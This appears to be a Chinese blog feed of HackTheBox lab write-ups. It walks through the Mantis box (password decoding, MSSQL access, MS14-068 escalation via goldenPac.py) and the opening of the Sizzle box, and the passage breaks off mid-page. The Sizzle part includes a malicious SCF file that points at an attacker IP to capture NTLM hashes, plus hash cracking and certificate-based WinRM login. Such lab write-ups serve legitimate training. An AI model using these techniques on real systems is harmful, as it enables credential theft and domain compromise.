class="line">1337/tcp  open  http         Microsoft IIS httpd 7.5</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">|_http-title: IIS7</span><br><span class="line">1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.10.10.52:1433:</span><br><span class="line">|     Target_Name: HTB</span><br><span class="line">|     NetBIOS_Domain_Name: HTB</span><br><span class="line">|     NetBIOS_Computer_Name: MANTIS</span><br><span class="line">|     DNS_Domain_Name: htb.local</span><br><span class="line">|     DNS_Computer_Name: mantis.htb.local</span><br><span class="line">|     DNS_Tree_Name: htb.local</span><br><span class="line">|_    Product_Version: 6.1.7601</span><br><span class="line">|_ssl-date: 2024-07-18T13:05:06+00:00; -3s from scanner time.</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.10.10.52:1433:</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2014 RTM</span><br><span class="line">|       number: 12.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2014</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-07-18T13:00:53</span><br><span class="line">|_Not valid after:  2054-07-18T13:00:53</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5722/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">8080/tcp  open  http         Microsoft IIS httpd 7.5</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Tossed Salad - Blog</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">9389/tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49167/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49176/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49182/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.10.10.52:50255:</span><br><span class="line">|     Target_Name: HTB</span><br><span class="line">|     NetBIOS_Domain_Name: HTB</span><br><span class="line">|     NetBIOS_Computer_Name: MANTIS</span><br><span class="line">|     DNS_Domain_Name: htb.local</span><br><span class="line">|     DNS_Computer_Name: mantis.htb.local</span><br><span class="line">|     DNS_Tree_Name: htb.local</span><br><span class="line">|_    Product_Version: 6.1.7601</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.10.10.52:50255:</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2014 RTM</span><br><span class="line">|       number: 12.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2014</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 50255</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-07-18T13:00:53</span><br><span class="line">|_Not valid after:  2054-07-18T13:00:53</span><br><span class="line">|_ssl-date: 2024-07-18T13:05:06+00:00; -3s from scanner time.</span><br><span class="line">Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 34m15s, deviation: 1h30m45s, median: -3s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2:1:0:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-07-18T13:04:48</span><br><span class="line">|_  start_date: 2024-07-18T13:00:29</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1</span><br><span class="line">|   Computer name: mantis</span><br><span class="line">|   NetBIOS computer name: MANTIS\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: mantis.htb.local</span><br><span class="line">|_  System time: 2024-07-18T09:04:52-04:00</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 110.51 seconds</span><br></pre></td></tr></table></figure><p>有<code>DNS</code>服务、<code>Kerberos</code>服务、<code>ldap</code>服务、<code>SMB</code>服务、在<code>1337</code>端口有<code>http</code>服务、在<code>1433</code> 端口上有<code>SQL Server</code>服务，域名为<code>mantis.htb.local</code>，<code>8080</code>端口上还有<code>http</code>服务，应该是个<code>Blog</code>，还有其他等多个端口。</p><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><p> <code>ldapsearch -x -H ldap://10.10.10.52:389 -s base -b &quot;&quot; namingcontexts</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718154746434-704756932.png" alt="image-20240718154737592"></p><p>没什么重要的信息</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><code>smbclient -L //10.10.10.52</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718154849413-1830849376.png" alt="image-20240718154840864"></p><p><code>smb</code>同样没有什么重要信息</p><h2 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h2><p>利用RPC远程过程调用枚举用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718212255182-877972644.png" alt="image-20240718212246343"></p><p>允许匿名访问，但不允许执行命令。</p><h2 id="1337端口"><a href="#1337端口" class="headerlink" title="1337端口"></a>1337端口</h2><p>此端口有<code>http</code>服务，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718212343495-1754620610.png" alt="image-20240718212334561"></p><p>是个正常的<code>IIS</code>服务，当前页面没啥信息，利用<code>gobuster</code>工具扫描一下</p><p><code>gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719105859519-1199674944.png" alt="image-20240719105840793"></p><p>发现有个<code>/secure_notes</code>目录，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719105933756-1435935472.png" alt="image-20240719105916031"></p><p>发现有两个文件</p><ul><li><code>web_config</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719105955413-1263203338.png" alt="image-20240719105944860"></p><p>这个没什么用，重点看第一个文件</p><ul><li><code>dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719110031571-1931928202.png" alt="image-20240719110021015"></p><p>看起来像是安装<code>cms</code>的操作步骤，如下载 SQL server 数据库、创建对应数据库和管理员等</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719110135329-2021603843.png" alt="image-20240719110124666"></p><p>在最下面找到一串二进制文件，疑似<code>admin</code>密码，利用工具尝试解密</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719110629100-105995333.png" alt="image-20240719110618385"></p><p>拿到密码<code>@dm!n_P@ssW0rd!</code></p><p>也可以利用<code>shell</code>命令解码</p><p><code>echo &quot;010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001&quot; | perl -lpe &#39;$_=pack&quot;B*&quot;,$_&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719111202945-1455444381.png" alt="image-20240719111148937"></p><p>这是会发现文件名像是某种编码，也拿工具尝试一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719110846704-1509776820.png" alt="image-20240719110835720"></p><p>成功拿到貌似是数据库的密码<code>m$$ql_S@_P@ssW0rd!</code></p><p>也可以利用<code>shell</code>命令解码</p><p><code>echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719111302001-1732461918.png" alt="image-20240719111251279"></p><p>这样我们就拿到了两个密码</p><h2 id="1433端口"><a href="#1433端口" class="headerlink" title="1433端口"></a>1433端口</h2><p>这个端口运行着<code>SQL Server</code>服务，上面已经拿到密码，尝试登陆</p><p>先尝试使用默认数据库管理员<code>sa</code>进行登录数据库</p><p><code>python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py &#39;sa:m$$ql_S@_P@ssW0rd!@10.10.10.52&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719112910589-1427023602.png" alt="image-20240719112859624"></p><p>登陆失败，感觉是用户名不对，使用 <code>OrchardCMS</code> 的管理员 <code>admin</code> 作为用户名登陆</p><p><code>python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py &#39;admin:m$$ql_S@_P@ssW0rd!@10.10.10.52&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113048163-1389822070.png" alt="image-20240719113037299"></p><p>登陆成功，接下来对数据库进行信息搜集，为了方便，使用<code>GUI</code>工具<code>DBeaver</code>进行连接</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113606800-1496602545.png" alt="image-20240719113555918"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113633820-92554602.png" alt="image-20240719113623175"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113856364-1854941201.png" alt="image-20240719113845434"></p><p>填好相关信息，下载好驱动就可以测试连接了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719113934286-81611401.png" alt="image-20240719113923598"></p><p>连接成功！接下来就可以查找用户信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719114616076-1096852668.png" alt="image-20240719114605389"></p><p>最终在<code>orcharddb</code>数据库中的<code>blog_Orchard_Users_UserPartRecord</code>表中找到一个<code>James</code>用户的用户名和密码</p><p><code>james : J@m3s_P@ssW0rd!</code></p><h2 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h2><p>这个端口有<code>http</code>服务，看样子是个<code>Blog</code>，先简单指纹识别一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718155206460-467081700.png" alt="image-20240718155158028"></p><p>发现<code>Orchard Core CMS</code></p><p>尝试搜索该CMS的历史漏洞，但是貌似没有什么能getshell的漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719141417773-1235008164.png" alt="image-20240719141406528"></p><h1 id="James-渗透"><a href="#James-渗透" class="headerlink" title="James 渗透"></a>James 渗透</h1><p>有了用户<code>James</code>的密码<code>J@m3s_P@ssW0rd!</code>接可以再次测试一些服务</p><h2 id="SMB-1"><a href="#SMB-1" class="headerlink" title="SMB"></a>SMB</h2><p>利用<code>crackmapexec</code>尝试登录<code>SMB</code>服务</p><p><code>crackmapexec smb 10.10.10.52 -u james -p &#39;J@m3s_P@ssW0rd!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722093550555-1508748961.png" alt="image-20240722093527746"></p><p>尝试利用<code>smbmap</code>连接查看<code>SMB</code>服务</p><p><code>smbmap -H 10.10.10.52 -u james -p &#39;J@m3s_P@ssW0rd!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722094127633-77556185.png" alt="image-20240722094104907"></p><p>发现当前用户对目录<code>SYSVOL</code>、<code>NETLOGON</code>拥有只读权限</p><h2 id="rpc-1"><a href="#rpc-1" class="headerlink" title="rpc"></a>rpc</h2><p><code>rpcclient -U james 10.10.10.52 --password=&#39;J@m3s_P@ssW0rd!&#39;</code></p><p><code>enumdomusers</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722094339148-278161430.png" alt="image-20240722094316905"></p><p>找到以上用户，但是没什么用</p><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>尝试进行一下<code>Kerberoasting</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722094800302-383462311.png" alt="image-20240722094731016"></p><p>仍然没有有用的信息</p><h1 id="MS14-068权限提升"><a href="#MS14-068权限提升" class="headerlink" title="MS14-068权限提升"></a>MS14-068权限提升</h1><blockquote><p>ms14-068 漏洞产生的原因是普通用户向 kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么返回给用户的TGT就使普通域用户拥有了域管理员权限。该用户可以将TGT发送给KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。而该漏洞的利用条件也非常简单，只需要拥有任意域用户的用户名、SID、密码即可获取域管理员权限。</p><p><a href="https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html">参考链接</a></p></blockquote><p>先修改本地 hosts 文件完成域名解析</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">10.10.10.52 mantis.htb.local mantis</span><br><span class="line">10.10.10.52 htb.local</span><br></pre></td></tr></table></figure><p>使用 <code>impacket</code> 工具包中的<code>goldenPac.py</code>可获取目标的系统权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722105556807-977799087.png" alt="image-20240722105534389"></p><p>成功拿到管理员权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722105706614-1389153774.png" alt="image-20240722105644503"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722105833170-745399915.png" alt="image-20240722105809518"></p><p>最后也是在<code>james</code>和<code>Administrator</code>的<code>Desktop</code>找到<code>user.txt</code>和<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory 101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Sizzle</title>
      <link href="/posts/33c7d1f3.html"/>
      <url>/posts/33c7d1f3.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.103</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>SCF文件攻击</li><li>Net-NTLMv2 hash破解</li><li>利用证书登录evil-winrm</li><li>BypassCLM</li><li>Kerberoasting</li><li>Bypass-AppLocker</li><li>DCSync攻击</li><li>PTH传递攻击</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -sS -sV -sC 10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714192941833-311799853.png" alt="image-20240714192938885"></p><p>发现有<code>ftp</code>服务、<code>DNS</code>服务、<code>Web</code>服务、<code>ldap</code>服务、 <code>smb</code>服务，域名为<code>HTB.LOCAL</code></p><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>扫描的结果显示<code>ftp</code>可以登录，使用<code>ftp</code>尝试登录</p><p><code>ftp 10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715095535177-874727963.png" alt="image-20240715095535121"></p><p>没什么有用的信息</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>发现开放<code>80</code>和<code>443</code>两个端口，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102127906-768479907.png" alt="image-20240715102126567"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102138843-732144389.png" alt="image-20240715102138611"></p><p>发现两个网站可能是同一个</p><p>拿<code>dirsearch</code>扫一下网站目录</p><p><code>dirsearch -u http://10.10.10.103/</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102637131-207095840.png" alt="image-20240715102636442"></p><p>很明显有个与众不同的结果访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102216653-962407690.png" alt="image-20240715102213171"></p><p>发现存在一个登录框，但是没有用户名和密码，先放着</p><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><p><code>ldapsearch -x -H ldap://10.10.10.103:389 -s base -b &quot;&quot; namingcontexts</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715100348580-149165439.png" alt="image-20240715100348090"></p><p>没什么有用的信息</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><code>smbclient -N -L \\10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715100733593-1338901198.png" alt="image-20240715100732440"></p><p>发现如上信息，测试一下</p><p><code>smbclient -U &quot;&quot; //10.10.10.103/CertEnroll</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715101406558-1730694173.png" alt="image-20240715101406187"></p><p>发现连接到<code>CertEnroll</code>，但是没有可执行命令的权限，但是这个很奇怪，感觉跟之前测试的<code>web</code>的登陆有关系，但是没有读取权限，继续测试</p><p> <code>smbclient -U &quot;&quot; //10.10.10.103/&quot;Department Shares&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102824347-2140539819.png" alt="image-20240715102824177"></p><p>发现在<code>Department Shares</code>里，可以继续操作，先接着测试</p><p><code>smbclient -U &quot;&quot; //10.10.10.103/NETLOGON</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715102714604-398683803.png" alt="image-20240715102714094"></p><p>还是无法执行命令，继续测试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715103850485-1432636840.png" alt="image-20240715103849910"></p><p>发现除了<code>Department Shares</code>其他都不可以正常执行命令，所以重点放在<code>Department Shares</code>上</p><p>我们注意到<code>dir</code>结果中有<code>Users</code>目录，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715104251701-1224385604.png" alt="image-20240715104251552"></p><p>拿到用户名列表，但是目录都是空的</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">amanda</span><br><span class="line">amanda_adm</span><br><span class="line">bill</span><br><span class="line">bobcd Users</span><br><span class="line">chris</span><br><span class="line">henry</span><br><span class="line">joe</span><br><span class="line">jose</span><br><span class="line">lkys37en</span><br><span class="line">morgan</span><br><span class="line">mrb3n</span><br><span class="line">Public</span><br></pre></td></tr></table></figure><p>为了方便后续操作以及便于查找相关文件，将<code>Department Shares</code>挂载到本地</p><p><code>mount -t cifs &quot;//10.10.10.103/Department Shares&quot; /root/htb/Machines/Sizzle/file</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715110927818-212747079.png" alt="image-20240715110927331"></p><p>文件有点多，写<code>bash</code>脚本检查该共享名下各个目录的写入权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> d | <span class="keyword">while</span> <span class="built_in">read</span> directory; <span class="keyword">do</span> </span><br><span class="line">    <span class="built_in">touch</span> <span class="variable">$&#123;directory&#125;</span>/a 2&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;directory&#125;</span> - write file&quot;</span> &amp;&amp; <span class="built_in">rm</span> <span class="variable">$&#123;directory&#125;</span>/a; </span><br><span class="line">    <span class="built_in">mkdir</span> <span class="variable">$&#123;directory&#125;</span>/a 2&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;directory&#125;</span> - write dir&quot;</span> &amp;&amp; <span class="built_in">rmdir</span> <span class="variable">$&#123;directory&#125;</span>/a; </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715112556282-78033102.png" alt="image-20240715112555698"></p><p>结果显示<code>/Users/Public</code>、<code>/ZZ_ARCHIVE</code>目录拥有写入权限</p><h1 id="获取用户名密码"><a href="#获取用户名密码" class="headerlink" title="获取用户名密码"></a>获取用户名密码</h1><h2 id="SCF文件攻击"><a href="#SCF文件攻击" class="headerlink" title="SCF文件攻击"></a>SCF文件攻击</h2><blockquote><p>SCF（Shell 命令文件）文件可用于执行一组有限的操作，例如显示 Windows 桌面或打开 Windows 资源管理器，然而，SCF 文件可用于访问渗透测试人员构建特定 UNC 路径用于攻击。将恶意代码可以放在一个SCF文件中，然后将其植入网络共享中。该文件在用户浏览文件所在目录时被执行，系统将通过smb协议向渗透测试人员构建的特定 UNC 路径发起Net-NTLM身份验证请求，此时的请求中包含该用户的Net-NTLM hash，攻击者使用responder即可捕获该用户的Net-NTLM  hash。</p><p><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SCF文件攻击</a></p><p><a href="https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html">Net-NTLM hash利用</a></p></blockquote><p>了解完攻击原理，下面就开始操作</p><p>先准备一份<code>.scf</code>文件，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.14.28\icon</span><br></pre></td></tr></table></figure><p>将其保存为<code>evil.scf</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715133205878-926345847.png" alt="image-20240715133205426"></p><p>将这个文件复制到<code>/Users/Public</code>和<code>/ZZ_ARCHIVE</code>下</p><p><code>cp ./evil.scf ./file/Users/Public/</code></p><p><code>cp ./evil.scf ./file/ZZ_ARCHIVE/</code></p><p>这时发现长时间后，该文件会自动删除，所以我们要在有限的时间内完成该操作</p><p>利用<code>kali</code>中的<code>responder</code>工具监听<code>tun0</code>网卡</p><p><code>responder -v -I tun0</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715145001346-1000664214.png" alt="image-20240715145000909"></p><p>在<code>/Users/Public</code>或<code>/ZZ_ARCHIVE</code>目录下执行一下命令来确保对共享目录进行操作，如显示目录文件等操作后才会触发这个<code>evil.scf</code></p><p>这里在<code>/Users/Public</code>下执行<code>ls</code>命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715143451775-597887204.png" alt="image-20240715143448053"></p><p>等待一段时间即可收到<code>hash</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715144941717-2133617100.png" alt="image-20240715144941244"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">amanda::HTB:6c1c482b8fd38bcspan><br></pre></td></tr></table></figure><h2 id="Net-NTLMv2-hash破解"><a href="#Net-NTLMv2-hash破解" class="headerlink" title="Net-NTLMv2 hash破解"></a>Net-NTLMv2 hash破解</h2><p>将上述<code>hash</code>值保存到文件<code>hash</code>中，使用<code>john</code>爆破</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715145240039-45553713.png" alt="image-20240715145239638"></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715145344115-203461178.png" alt="image-20240715145343859"></p><p>至此拿到一个用户名和密码：<code>amanda : Ashare1972</code></p><p>先利用<code>crackmapexec</code>验证一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715145725094-1900698795.png" alt="image-20240715145724720"></p><p>尝试使用<code>evil-winrm</code>登陆失败</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715150558411-1621839895.png" alt="image-20240715150558016"></p><p>猜测是身份验证出了问题</p><h1 id="通过获取的证书实现登录"><a href="#通过获取的证书实现登录" class="headerlink" title="通过获取的证书实现登录"></a>通过获取的证书实现登录</h1><p>之前<code>web</code>服务有个登陆界面，尝试拿<code>amanda</code>的用户名登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715150537725-584889206.png" alt="image-20240715150537115"></p><p>登陆成功</p><p>这个网站允许我生成一个证书，我们可以利用该证书来进行身份验证</p><p>我们可以创建自己的证书签名请求 (<code>csr</code>) 和密钥，然后将该 <code>CSR</code> 提交给服务器，它会返回给我一个证书。</p><p>首先使用 <code>openssl</code>创建 <code>CSR</code> 和密钥</p><p><code>openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715153140520-1221636402.png" alt="image-20240715153139686"></p><p>按照网站上的步骤提交我们的证书请求</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715153928398-419142793.png" alt="image-20240715153926792"></p><p>接着点击高级证书请求</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715153942831-898952688.png" alt="image-20240715153942674"></p><p>准备好我们的证书签名</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715154050380-1923290039.png" alt="image-20240715154049876"></p><p>将其粘贴到网站中后点击提交</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715154147499-1427367506.png" alt="image-20240715154147144"></p><p>证书生成成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715162307496-991142482.png" alt="image-20240715162307140"></p><p>证书下载后移至本目录下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715162436611-174996876.png" alt="image-20240715162429122"></p><p>有了证书和密钥可使用<code>evil-winrm</code>以<code>amanda</code>来进行身份验证。需要注意的是需要在端口<code>5689</code>上连接</p><p><code>evil-winrm -c certnew.cer -k amanda.key -i 10.10.10.103 -u amanda -p Ashare1972 -S</code></p><p>这里使用<code>-S</code>参数来指定使用<code>ssl</code>证书登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715165028826-1008718515.png" alt="image-20240715165027041"></p><h1 id="AD域横移"><a href="#AD域横移" class="headerlink" title="AD域横移"></a>AD域横移</h1><h2 id="环境受限"><a href="#环境受限" class="headerlink" title="环境受限"></a>环境受限</h2><p>发现这个用户的桌面没有我们想要的东西，还需要继续探测，但是用自带的<code>uplaod</code>传文件传不上去，看了下报错，也在网上搜了一下，发现我们可能是处于 <code>PowerShell</code> 约束语言模式，以下命令可以检查当前<code>powershell</code>的模式</p><p><code>$executioncontext.sessionstate.languagemode</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715192636382-579310471.png" alt="image-20240715192634771"></p><p>此时我们得到的是一个低权限<code>PS</code>控制台，并且改用<code>PowerShell Version 2</code>引擎也无法摆脱这种情况，由于<code>AppLocker</code>将<code>PowerShell</code>以约束模式运行，攻击者无法将<code>PowerShell</code>语言模式更改为完整模式以运行攻击工具，无法使用核心语言功能（例如，在内存中加载脚本等等……）是很难受的一件事情。</p><p>尝试发现一下域内的成员信息</p><p><img 